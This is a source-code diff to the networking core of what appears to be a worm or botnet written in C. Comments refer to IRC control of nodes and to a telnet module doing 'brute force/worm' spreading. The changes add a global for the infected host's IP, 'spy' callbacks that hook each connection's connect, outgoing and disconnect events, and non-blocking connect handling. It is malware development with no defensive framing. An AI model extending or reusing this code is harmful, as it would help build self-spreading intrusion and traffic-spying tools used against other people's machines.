@@ -89,6 +89,7 @@ so nodes can use several communication methods, and irc can be used to control
 #include <string.h>
 #include <arpa/inet.h>
 #include <fcntl.h>
+#include <errno.h>
 #include "structs.h"
 #include "list.h"
 #include "utils.h"
@@ -124,6 +125,10 @@ Modules *module_list = NULL;
 SpyFuncs *spy_list = NULL;
 
 
+// our IP passed from telnet module during brute force/worm
+char my_ip[16] = "\0";
+
+
 // prepare fd set / fd & max fds for select()
 void setup_fd(fd_set *fdset, fd_set *fdset2, fd_set *fdset3, int fd, int *max_fd) {
     // set the fd inside of fd_set
@@ -151,12 +156,18 @@ SpyFuncs *SpyGet(Modules *mptr) {
 void OutgoingFlush(Connection *cptr) {
     Queue *qptr = NULL;
     int cur_time = time(0);
+    SpyFuncs *sptr = SpyGet(cptr->module);
+    
     
     // is this a new connection?
     if (cptr->state == TCP_NEW) {
         cptr->state = TCP_CONNECTED;
+
+        if (sptr != NULL && sptr->connect != NULL)
+            sptr->connect(cptr->module, cptr, NULL, 0);
         
         if (cptr->module->functions->connect != NULL) {
+            
             if (cptr->module->functions->connect(cptr->module, cptr, NULL, 0) == 1)
                 return;
         }
@@ -251,12 +262,19 @@ the module can choose to keep it alive (by reconnecting, etc)
 */
 void ConnectionBad(Connection *cptr) {
     int r = 0;
+    SpyFuncs *sptr = SpyGet(cptr->module);
+    
+    if (sptr != NULL && sptr->outgoing_ptr != NULL)
+        sptr->outgoing_ptr(cptr->module, cptr, NULL, 0);
     
     // free buffers..
     QueueFree(&cptr->incoming);
     QueueFree(&cptr->outgoing);
     
     if (cptr->module && cptr->module->functions->disconnect) {
+        if (sptr != NULL && sptr->disconnect != NULL)
+            sptr->disconnect(cptr->module, cptr, NULL, 0);
+            
         r = cptr->module->functions->disconnect(cptr->module, cptr, NULL, 0);
         // 1 from disconnect means we are reusing...
         if (r == 1) {
@@ -421,7 +439,7 @@ void ConnectionRead(Connection *cptr) {
 void network_main_loop(Modules *mptr) {
     Queue *qptr = NULL;
     Connection *cptr = NULL;
-    SpyFuncs *sptr = SpyGet(mptr);;
+    SpyFuncs *sptr = SpyGet(mptr);
         
     // loop for each connection under this module..
     for (cptr = mptr->connections; cptr != NULL; cptr = cptr->next) {
@@ -835,7 +853,7 @@ Connection *tcp_connect(Modules *mptr, Connection **connections, uint32_t ip, in
     // lets do this before allocating the connection structure..
     r = connect(fd, (struct sockaddr *)&dst, sizeof(dst));
     
-    if (r == -1) {
+    if (r == -1 && errno != 36) {
         close(fd);
         
         return NULL;
